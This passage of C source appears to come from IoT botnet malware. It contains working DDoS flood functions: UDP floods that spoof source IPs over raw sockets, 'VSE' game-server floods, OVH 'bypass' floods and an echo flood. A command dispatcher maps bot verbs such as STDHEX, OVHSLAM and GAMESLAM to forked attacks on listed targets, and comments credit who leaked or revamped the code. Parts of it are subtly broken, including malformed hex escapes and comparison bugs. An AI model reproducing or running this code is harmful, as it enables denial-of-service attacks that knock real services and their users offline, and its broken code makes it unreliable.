        while(1){
            sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
            if(i == pollRegister){
                if(port == 0) dest_addr.sin_port = rand_cmwc();
                if(time(NULL) > end) break;
                i = 0;
                continue;
            }
            i++;
            if(ii == sleepcheck){
                usleep(sleeptime*1000);
                ii = 0;
                continue;
            }
            ii++;
        }
    }
    else{
        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
        if(!sockfd){
            return;
        }
        int tmp = 1;
        if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0){
            return;
        }
        int counter = 50;
        while(counter--){
            srand(time(NULL) ^ rand_cmwc());
            rand_init();
        }
        in_addr_t netmask;
        if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
        else netmask = ( ~((1 << (32 - spoofit)) - 1) );
        unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
        struct iphdr *iph = (struct iphdr *)packet;
        struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
        makevsepacket(iph, dest_addr.sin_addr.s_addr, htonl( findRandIP(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);
        udph->len = htons(sizeof(struct udphdr) + packetsize + vse_payload_len);
        udph->source = rand_cmwc();
        udph->dest = (port == 0 ? rand_cmwc() : htons(port));
        udph->check = 0;
        udph->check = checksum_tcp_udp(iph, udph, udph->len, sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len);
        makeRandomStr((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);
        iph->check = csum ((unsigned short *) packet, iph->tot_len);
        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        register unsigned int ii = 0;
        while(1){
            sendto(sockfd, packet, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len, sizeof(packet), (struct sockaddr *)&dest_addr, sizeof(dest_addr));
            udph->source = rand_cmwc();
            udph->dest = (port == 0 ? rand_cmwc() : htons(port));
            iph->id = rand_cmwc();
            iph->saddr = htonl( findRandIP(netmask) );
            iph->check = csum ((unsigned short *) packet, iph->tot_len);
            if(i == pollRegister){
                if(time(NULL) > end) break;
                i = 0;
                continue;
            }
            i++;
            if(ii == sleepcheck){
                usleep(sleeptime*1000);
                ii = 0;
                continue;
            }
            ii++;
        }
    }
}
void makevsepacket1(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize)
{
    char *vse_payload;
    int vse_payload_len;
    vse_payload = "/x78/xA3/x69/x6A/x20/x44/x61/x6E/x6B/x65/x73/x74/x20/x53/x34/xB4/x42/x03/x23/x07/x82/x05/x84/xA4/xD2/x04/xE2/x14/x64/xF2/x05/x32/x14/xF4/ + /x78/xA3/x69/x6A/x20/x44/x61/x6E/x6B/x65/x73/x74/x20/x53/x34/xB4/x42/x03/x23/x07/x82/x05/x84/xA4/xD2/x04/xE2/x14/x64/xF2/x05/x32/x14/xF4/ w290w2xn", &vse_payload_len;
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + packetSize + vse_payload_len;
        iph->id = rand_cmwc();
        iph->frag_off = 0;
        iph->ttl = MAXTTL;
        iph->protocol = protocol;
        iph->check = 0;
        iph->saddr = source;
        iph->daddr = dest;
}//VSE Method Revamped By FranceOVH
void vseattack1(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime)
{
    char *vse_payload;
    int vse_payload_len;
    vse_payload = "/x78/xA3/x69/x6A/x20/x44/x61/x6E/x6B/x65/x73/x74/x20/x53/x34/xB4/x42/x03/x23/x07/x82/x05/x84/xA4/xD2/x04/xE2/x14/x64/xF2/x05/x32/x14/xF4/ + /x78/xA3/x69/x6A/x20/x44/x61/x6E/x6B/x65/x73/x74/x20/x53/x34/xB4/x42/x03/x23/x07/x82/x05/x84/xA4/xD2/x04/xE2/x14/x64/xF2/x05/x32/x14/xF4/ w290w2xn", &vse_payload_len;
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    if(port == 0) dest_addr.sin_port = rand_cmwc();
    else dest_addr.sin_port = htons(port);
    if(getHost(target, &dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
    register unsigned int pollRegister;
    pollRegister = pollinterval;
    if(spoofit == 32) {
    int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(!sockfd) {
    return;
    }
    unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
    if(buf == NULL) return;
    memset(buf, 0, packetsize + 1);
    makeRandomStr(buf, packetsize);
    int end = time(NULL) + timeEnd;
    register unsigned int i = 0;
    register unsigned int ii = 0;
    while(1) {
    sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
    if(i == pollRegister) {
    if(port == 0) dest_addr.sin_port = rand_cmwc();
    if(time(NULL) > end) break;
    i = 0;
    continue;
                    }
    i++;
    if(ii == sleepcheck) {
    usleep(sleeptime*1000);
    ii = 0;
    continue;
                    }
    ii++;
            }
            } else {
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if(!sockfd) {
    return;
                }
    int tmp = 1;
    if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0) {
    return;
                }
    int counter = 50;
    while(counter--) {
    srand(time(NULL) ^ rand_cmwc());
                }
    in_addr_t netmask;
    if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
    else netmask = ( ~((1 << (32 - spoofit)) - 1) );
    unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
    struct iphdr *iph = (struct iphdr *)packet;
    struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
    makevsepacket1(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);
    udph->len = htons(sizeof(struct udphdr) + packetsize + vse_payload_len);
    udph->source = rand_cmwc();
    udph->dest = (port == 0 ? rand_cmwc() : htons(port));
    udph->check = 0;
    udph->check = (iph, udph, udph->len, sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len);
    makeRandomStr((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);
    iph->check = csum ((unsigned short *) packet, iph->tot_len);
    int end = time(NULL) + timeEnd;
    register unsigned int i = 0;
    register unsigned int ii = 0;
    while(1) {
    sendto(sockfd, packet, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len, sizeof(packet), (struct sockaddr *)&dest_addr, sizeof(dest_addr));
    udph->source = rand_cmwc();
    udph->dest = (port == 0 ? rand_cmwc() : htons(port));
    iph->id = rand_cmwc();
    iph->saddr = htonl( getRandomIP(netmask) );
    iph->check = csum ((unsigned short *) packet, iph->tot_len);
    if(i == pollRegister) {
    if(time(NULL) > end) break;
    i = 0;
    continue;
            }
    i++;
    if(ii == sleepcheck) {
    usleep(sleeptime*1000);
    ii = 0;
    continue;
                }
    ii++;
            }
        }
    }
void sendBypass(unsigned char *ip, int port, int secs) 
{
    int std_hex;
    std_hex = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    time_t start = time(NULL);
    struct sockaddr_in sin;
    struct hostent *hp;
    hp = gethostbyname(ip);
    bzero((char*) &sin,sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = port;
    unsigned int a = 0;
    while(1)
    {
        char *hexstring[] = {"/x50/x33/x43/x4B/x24/x54/x20/x47/x38/x33/x41/x52/x44/x20/x30/x4E/x20/x54/x30/x50/x20/x50/x38/x54/x43/x48/x20/x49/x54/x20/x42/x22/x42/x59/"};
        {
            send(std_hex, hexstring, std_packets, 0);
            connect(std_hex,(struct sockaddr *) &sin, sizeof(sin));
            if (time(NULL) >= start + secs)
            {
                close(std_hex);
                _exit(0);
            }
            a = 0;
        }
        a++;
    }
}
void sendBypassTwo(unsigned char *ip, int port, int secs, int packetsize) 
{
        int std_hex;
        std_hex = socket(AF_INET, SOCK_DGRAM, 0);
        time_t start = time(NULL);
        struct sockaddr_in sin;
        struct hostent *hp;
        hp = gethostbyname(ip);
        bzero((char*) &sin,sizeof(sin));
        bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
        sin.sin_family = hp->h_addrtype;
        sin.sin_port = port;
        unsigned int a = 0;
        while(1)
        {         //change it if u want
                char *hexstring[] = {"4E/x31/x6B/x4B/x31/x20/x21/x73/x69/x20/x4D/x33/x75/x79/x20/x4C/x30/x56/x72/x33/x20/x3C/x33/x20/x50/x61/x32/x72/x43/x48/x20/x4D/x32/x20/x41/x34/x34/x72/x43/x4B"};
                if (a >= 50)
                {
                        send(std_hex, hexstring, packetsize, 0);
                        connect(std_hex,(struct sockaddr *) &sin, sizeof(sin));
                        if (time(NULL) >= start + secs)
                        {
                                close(std_hex);
                                _exit(0);
                        }
                        a = 0;
                }
                a++;
        }
}
void SendSTDHEX1(unsigned char *ip, int port, int secs)
    {
    int std_hex1;
    std_hex1 = socket(AF_INET, SOCK_DGRAM, 0);
    time_t start = time(NULL);
    struct sockaddr_in sin;
    struct hostent *hp;
    hp = gethostbyname(ip);
    bzero((char*) &sin,sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = port;
    unsigned int a = 0;
    while(1)
    {
        char *rhexstring[] = {
        "/x6f/x58/x22/x2e/x04/x92/x04/xa4/x42/x94/xb4/xf4/x44/xf4/x94/xd2/x04/xb4/xc4/xd2/x05/x84/xb4/xa4/xa6/xb3/x24/xd4/xb4/xf4/xa5/x74/xf4/x42/x04/x94/xf2/x24/xf5/x02/x03/xc4/x45/x04/xf5/x14/x44/x23",
        "\x78\x6d\x69\x77\x64\x69\x6f\x20\x4d\x4f\x51\x57\x49\x22\x4b\x20\x28\x2a\x2a\x28\x44\x38\x75\x39\x32\x38\x39\x64\x32\x38\x39\x32\x65\x39\x20\x4e\x49\x4f\x57\x4a\x44\x69\x6f\x6a\x77\x69\x6f\x57\x41\x4a\x4d\x20\x44\x4b\x4c\x41\x4d\x29\x20",
        "/x48/x39/x32/x29/x53/x54/x49/x6c/x65/x20/x29/x5f/x51/x20/x49/x53/x4e/x22/x20/x4b/x58/x4d/x3c/x20/x4f/x53/x51/x22/x4f/x50/x20/x50/x41/x43/x4b/x45/x54/x20/xc2/xa3/x52/x4f/x4d/x57/x44/x4b/x4c/x57",
        };
        if (a >= 50)
        {
            send(std_hex1, rhexstring, std_packet, 0);
            connect(std_hex1,(struct sockaddr *) &sin, sizeof(sin));
            if (time(NULL) >= start + secs)
            {
                close(std_hex1);
                _exit(0);
            }
            a = 0;
        }
        a++;
    }
}
void supermakevsepacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize)
{
    char *vse_payload;
    int vse_payload_len;
    int vserand;
    srand(time(NULL));
    vserand = rand() % 60;
    if(vserand < 20) {
     vse_payload = "/58/x49/x4a/x20/x51/x22/x29/x29/x51/x50/x57/x4b/x4f/x4d/x20/x54/x45/x4d/x4b/x22/x20/x6c/x78/x50/x51/x7b/x58/x4c/x20/x22/x28/x4b/x69/x6a/x6e/x6a/x4e/x4b/x20/x58/x4e/x43/x4b/x46/x45/x3a/x4c/x3a/x20/x22/x22/x33/x35/x34/x35/x20/x32/x73/x6d/x6b/x6c/x78/x43/x20/x4b/x4d/x4c/x44", &vse_payload_len;
    }
        else if(20 < vserand < 40) {
     vse_payload = "/46/x55/x5a/xc2/xa3/x20/x44/xc2/xa3/x53/x54/x20/x53/x30/x22/xc2/xa3/x43/x45/x20/x22/x29/x21/x28/x32/x30/x39/x31/x20/x53/x49/x58/x20/x33/xc2/xa3/x43/x53/x54/x20/x46/x4c/x4f/x22/x53/x44/x20/x22/x29/x21/x28/x20/x43/x49/x57/x4a/x4f/x20/x59/x48/x53/x20/x48/x20/x78/x4b/x4d/x4f", &vse_payload_len;
    }
        else if(40 < vserand < 60) {
     vse_payload = "/x4f/x4b/x58/x50/x7b/x20/x5f/x57/x44/x44/x57/x44/6ax/x4a/x4b/x4d/x44/x20/x44/x57/x29/x5f/x20/x44/x57/x20/x53/x4c/x52/x4f/x4d/x20/x43/x50/x4c/x3a/x50/", &vse_payload_len;
    }

        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + packetSize + vse_payload_len;
        iph->id = rand_cmwc();
        iph->frag_off = 0;
        iph->ttl = MAXTTL;
        iph->protocol = protocol;
        iph->check = 0;
        iph->saddr = source;
        iph->daddr = dest;
}
void supervseattack(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime)
{
    char *vse_payload;
    int vse_payload_len;
    int vserand;
    srand(time(NULL));
    vserand = rand() % 60;
    if(vserand < 20) {
     vse_payload = "/58/x49/x4a/x20/x51/x22/x29/x29/x51/x50/x57/x4b/x4f/x4d/x20/x54/x45/x4d/x4b/x22/x20/x6c/x78/x50/x51/x7b/x58/x4c/x20/x22/x28/x4b/x69/x6a/x6e/x6a/x4e/x4b/x20/x58/x4e/x43/x4b/x46/x45/x3a/x4c/x3a/x20/x22/x22/x33/x35/x34/x35/x20/x32/x73/x6d/x6b/x6c/x78/x43/x20/x4b/x4d/x4c/x44", &vse_payload_len;
    }
        else if(20 < vserand < 40) {
     vse_payload = "/46/x55/x5a/xc2/xa3/x20/x44/xc2/xa3/x53/x54/x20/x53/x30/x22/xc2/xa3/x43/x45/x20/x22/x29/x21/x28/x32/x30/x39/x31/x20/x53/x49/x58/x20/x33/xc2/xa3/x43/x53/x54/x20/x46/x4c/x4f/x22/x53/x44/x20/x22/x29/x21/x28/x20/x43/x49/x57/x4a/x4f/x20/x59/x48/x53/x20/x48/x20/x78/x4b/x4d/x4f/", &vse_payload_len;
    }
        else if(40 < vserand < 60) {
     vse_payload = "/x4f/x4b/x58/x50/x7b/x20/x5f/x57/x44/x44/x57/x44/6ax/x4a/x4b/x4d/x44/x20/x44/x57/x29/x5f/x20/x44/x57/x20/x53/x4c/x52/x4f/x4d/x20/x43/x50/x4c/x3a/x50/", &vse_payload_len;// 
    }
    
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    if(port == 0) dest_addr.sin_port = rand_cmwc();
    else dest_addr.sin_port = htons(port);
    if(getHost(target, &dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
    register unsigned int pollRegister;
    pollRegister = pollinterval;
    if(spoofit == 32) {
    int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(!sockfd) {
    return;
    }
    unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
    if(buf == NULL) return;//wyn 
    memset(buf, 0, packetsize + 1);
    makeRandomStr(buf, packetsize);
    int end = time(NULL) + timeEnd;
    register unsigned int i = 0;
    register unsigned int ii = 0;
    while(1) {
    sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
    if(i == pollRegister) {
    if(port == 0) dest_addr.sin_port = rand_cmwc();
    if(time(NULL) > end) break;
    i = 0;
    continue;
                    }
    i++;
    if(ii == sleepcheck) {
    usleep(sleeptime*1000);
    ii = 0;//wyn
    continue;
                    }
    ii++;
            }
            } else {
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if(!sockfd) {
    return;
                }
    int tmp = 1;
    if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0) {
    return;
                }
    int counter = 50;
    while(counter--) {
    srand(time(NULL) ^ rand_cmwc());
                }
    in_addr_t netmask;
    if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
    else netmask = ( ~((1 << (32 - spoofit)) - 1) );
    unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
    struct iphdr *iph = (struct iphdr *)packet;
    struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
    makevsepacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);
    udph->len = htons(sizeof(struct udphdr) + packetsize + vse_payload_len);
    udph->source = rand_cmwc();
    udph->dest = (port == 0 ? rand_cmwc() : htons(port));
    udph->check = 0;
    udph->check = (iph, udph, udph->len, sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len);
    makeRandomStr((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);
    iph->check = csum ((unsigned short *) packet, iph->tot_len);
    int end = time(NULL) + timeEnd;
    register unsigned int i = 0;
    register unsigned int ii = 0;
    while(1) {
    sendto(sockfd, packet, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len, sizeof(packet), (struct sockaddr *)&dest_addr, sizeof(dest_addr));
    udph->source = rand_cmwc();
    udph->dest = (port == 0 ? rand_cmwc() : htons(port));
    iph->id = rand_cmwc();
    iph->saddr = htonl( getRandomIP(netmask) );
    iph->check = csum ((unsigned short *) packet, iph->tot_len);
    if(i == pollRegister) {
    if(time(NULL) > end) break;
    i = 0;
    continue;
            }
    i++;
    if(ii == sleepcheck) {
    usleep(sleeptime*1000);
    ii = 0;
    continue;
                }
    ii++;
            }
        }
    }
void makeechopacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize){
    char *echo_payload;
    int echo_payload_len;
    echo_payload = "\x0D\x0A\x0D\x0A", &echo_payload_len;
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + packetSize + echo_payload_len;
        iph->id = rand_cmwc();
        iph->frag_off = 0;
        iph->ttl = MAXTTL;
        iph->protocol = protocol;
        iph->check = 0;
        iph->saddr = source;
        iph->daddr = dest;
}
void echoattack(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime){
    char *echo_payload;
    int echo_payload_len;
    echo_payload = "\x0D\x0A\x0D\x0A", &echo_payload_len;
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    if(port == 0) dest_addr.sin_port = rand_cmwc();
    else dest_addr.sin_port = htons(port);
    if(getHost(target, &dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
    register unsigned int pollRegister;
    pollRegister = pollinterval;
    if(spoofit == 32){
        int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if(!sockfd){
            return;
        }
        unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
        if(buf == NULL) return;
        memset(buf, 0, packetsize + 1);
        makeRandomStr(buf, packetsize);
        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        register unsigned int ii = 0;
        while(1){
            sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
            if(i == pollRegister){
                if(port == 0) dest_addr.sin_port = rand_cmwc();
                if(time(NULL) > end) break;
                i = 0;
                continue;
            }
            i++;
            if(ii == sleepcheck){
                usleep(sleeptime*1000);
                ii = 0;
                continue;
            }
            ii++;
        }
    }
    else{
        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
        if(!sockfd){
            return;
        }
        int tmp = 1;
        if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0){
            return;
        }
        int counter = 50;
        while(counter--){
            srand(time(NULL) ^ rand_cmwc());
            rand_init();
        }
        in_addr_t netmask;
        if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
        else netmask = ( ~((1 << (32 - spoofit)) - 1) );
        unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
        struct iphdr *iph = (struct iphdr *)packet;
        struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
        makeechopacket(iph, dest_addr.sin_addr.s_addr, htonl( findRandIP(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);
        udph->len = htons(sizeof(struct udphdr) + packetsize + echo_payload_len);
        udph->source = rand_cmwc();
        udph->dest = (port == 0 ? rand_cmwc() : htons(port));
        udph->check = 0;
        udph->check = checksum_tcp_udp(iph, udph, udph->len, sizeof (struct udphdr) + sizeof (uint32_t) + echo_payload_len);
        makeRandomStr((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);
        iph->check = csum ((unsigned short *) packet, iph->tot_len);
        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        register unsigned int ii = 0;
        while(1){
            sendto(sockfd, packet, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (uint32_t) + echo_payload_len, sizeof(packet), (struct sockaddr *)&dest_addr, sizeof(dest_addr));
            udph->source = rand_cmwc();
            udph->dest = (port == 0 ? rand_cmwc() : htons(port));
            iph->id = rand_cmwc();
            iph->saddr = htonl( findRandIP(netmask) );
            iph->check = csum ((unsigned short *) packet, iph->tot_len);
            if(i == pollRegister){
                if(time(NULL) > end) break;
                i = 0;
                continue;
            }
            i++;
            if(ii == sleepcheck){
                usleep(sleeptime*1000);
                ii = 0;
                continue;
            }
            ii++;
        }
    }
}


void processCmd(int argc, unsigned char *argv[]){
        if(!strcmp(argv[0], "ZGO")){ //UDP HEX
                if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1 || atoi(argv[3]) > 10000){
            return;
                }
                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                if(strstr(ip, ",") != NULL){
                    unsigned char *hi = strtok(ip, ",");
                    while(hi != NULL){
                        if(!listFork()){
                          sendZalgoTwo(hi, port, time);
                          _exit(0);
                        }
                    hi = strtok(NULL, ",");
                    }
             } else {
                 if (listFork()) { return; }
                 sendZalgoTwo(ip, port, time);
                 _exit(0);
             }
        }
        if(!strcmp(argv[0], "ZAGO")){ //UDP HEX
                if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1 || atoi(argv[3]) > 10000){
            return;
                }
                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                if(strstr(ip, ",") != NULL){
                    unsigned char *hi = strtok(ip, ",");
                    while(hi != NULL){
                        if(!listFork()){
                          sendZalgo(hi, port, time);
                          _exit(0);
                        }
                    hi = strtok(NULL, ",");
                    }
             } else {
                 if (listFork()) { return; }
                 sendZalgo(ip, port, time);
                 _exit(0);
             }
        }
        if(!strcmp(argv[0], "STDHEX")){ //UDP HEX
                if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1 || atoi(argv[3]) > 10000){
            return;
                }
                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                if(strstr(ip, ",") != NULL){
                    unsigned char *hi = strtok(ip, ",");
                    while(hi != NULL){
                        if(!listFork()){
                          SendSTDHEX1(hi, port, time);
                          _exit(0);
                        }
                    hi = strtok(NULL, ",");
                    }
             } else {
                 if (listFork()) { return; }
                 SendSTDHEX1(ip, port, time);
                 _exit(0);
             }
        }
        if(!strcmp(argv[0], "STD")){ //UDP HEX
                if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1 || atoi(argv[3]) > 10000){
            return;
                }
                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                if(strstr(ip, ",") != NULL){
                    unsigned char *hi = strtok(ip, ",");
                    while(hi != NULL){
                        if(!listFork()){
                          SendSTDHEX1(hi, port, time);
                          _exit(0);
                        }
                    hi = strtok(NULL, ",");
                    }
             } else {
                 if (listFork()) { return; }
                 SendSTDHEX1(ip, port, time);
                 _exit(0);
             }
        }
        if(!strcmp(argv[0], "WEBSITE")){ //UDP HEX
                if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1 || atoi(argv[3]) > 10000){
            return;
                }
                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                if(strstr(ip, ",") != NULL){
                    unsigned char *hi = strtok(ip, ",");
                    while(hi != NULL){
                        if(!listFork()){
                          sendBypass(hi, port, time);
                          _exit(0);
                        }
                    hi = strtok(NULL, ",");
                    }
             } else {
                 if (listFork()) { return; }
                 sendBypass(ip, port, time);
                 _exit(0);
             }
        }
        if(!strcmp(argv[0], "OVHSLAM")){ //UDP HEX
                if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1 || atoi(argv[3]) > 10000){
            return;
                }
                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                int packetSSize = 8191;
                if(strstr(ip, ",") != NULL){
                    unsigned char *hi = strtok(ip, ",");
                    while(hi != NULL){
                        if(!listFork()){
                          sendBypassTwo(hi, port, time, packetSSize); 
                          _exit(0);
                        }
                    hi = strtok(NULL, ",");
                    }
             } else {
                 if (listFork()) { return; }
                 sendBypassTwo(ip, port, time, packetSSize);
                 _exit(0);
             }
        }
        if(!strcmp(argv[0], "OVHNULL")){ //UDP HEX
                if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1 || atoi(argv[3]) > 10000){
            return;
                }
                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                if(strstr(ip, ",") != NULL){
                    unsigned char *hi = strtok(ip, ",");
                    while(hi != NULL){
                        if(!listFork()){
                          SendSTDHEX1(hi, port, time);
                          _exit(0);
                        }
                    hi = strtok(NULL, ",");
                    }
             } else {
                 if (listFork()) { return; }
                 SendSTDHEX1(ip, port, time);
                 _exit(0);
             }
        }
        if(!strcmp(argv[0], "ZLGO")){ //UDP HEX
                if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1 || atoi(argv[3]) > 10000){
            return;
                }
                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                if(strstr(ip, ",") != NULL){
                    unsigned char *hi = strtok(ip, ",");
                    while(hi != NULL){
                        if(!listFork()){
                          sendZalgoTwo(hi, port, time);
                          sendZalgo(hi, port, time);
                          SendSTDHEX(hi, port, time);
                          _exit(0);
                        }
                    hi = strtok(NULL, ",");
                    }
             } else {
                 if (listFork()) { return; }
                 sendZalgoTwo(ip, port, time);
                 sendZalgo(ip, port, time);
                 SendSTDHEX(ip, port, time);
                 _exit(0);
             }
        }
        if(!strcmp(argv[0], "GAMESLAM")) {
            if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[5]) == -1 || atoi(argv[5]) > 65536 || atoi(argv[5]) > 65500 || atoi(argv[4]) > 32 || (argc == 7 && atoi(argv[6]) < 1)) {
            return;
            }
            unsigned char *ip = argv[1];
            int port = atoi(argv[2]);
            int time = atoi(argv[3]);
            int spoofed = atoi(argv[4]);
            int packetsize = atoi(argv[5]);
            int pollinterval = (argc > 6 ? atoi(argv[6]) : 1000);
            int sleepcheck = (argc > 7 ? atoi(argv[7]) : 1000000);
            int sleeptime = (argc > 8 ? atoi(argv[8]) : 0);
            if(strstr(ip, ",") != NULL) {
                unsigned char *hi = strtok(ip, ",");
                while(hi != NULL) {
                    if(!listFork()) {
                        vseattack1(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        _exit(0);
                    }
                    hi = strtok(NULL, ",");
                }
            } else {
                if (!listFork()){ return; }
                vseattack1(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                _exit(0);
            }
        }///Leaked by Fhlix
        if(!strcmp(argv[0], "VSE")) {
            if(argc < 4 || atoi(argv[3]) == -1 || atoi(argv[3]) > 10000 || atoi(argv[2]) == -1){
                return;
            }
            unsigned char *ip = argv[1];
            int port = atoi(argv[2]);
            int time = atoi(argv[3]);
            int spoofed = 32;
            int packetsize = 1024;
            int pollinterval = (argc > 4 ? atoi(argv[4]) : 1000);
            int sleepcheck = (argc > 5 ? atoi(argv[5]) : 1000000);
            int sleeptime = (argc > 6 ? atoi(argv[6]) : 0);
            if(strstr(ip, ",") != NULL) {
                unsigned char *hi = strtok(ip, ",");
                while(hi != NULL) {
                    if(!listFork()) {
                        vseattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        _exit(0);
                    }
                    hi = strtok(NULL, ",");
                }
            } else {
                if (!listFork()){
                vseattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);}
                _exit(0);
            }
        }
        if(!strcmp(argv[0], "VSEHEX")) {
            if(argc < 4 || atoi(argv[3]) == -1 || atoi(argv[3]) > 10000 || atoi(argv[2]) == -1){
                return;
            }
            unsigned char *ip = argv[1];
            int port = atoi(argv[2]);
            int time = atoi(argv[3]);
            int spoofed = 32;
            int packetsize = 1024;
            int pollinterval = (argc > 4 ? atoi(argv[4]) : 1000);
            int sleepcheck = (argc > 5 ? atoi(argv[5]) : 1000000);
            int sleeptime = (argc > 6 ? atoi(argv[6]) : 0);
            if(strstr(ip, ",") != NULL) {
                unsigned char *hi = strtok(ip, ",");
                while(hi != NULL) {
                    if(!listFork()) {
                        supervseattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        _exit(0);
                    }
                    hi = strtok(NULL, ",");
                }
            } else {
                if (!listFork()){
                supervseattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);}
                _exit(0);
            }
        }
        if(!strcmp(argv[0], "RIP")) {
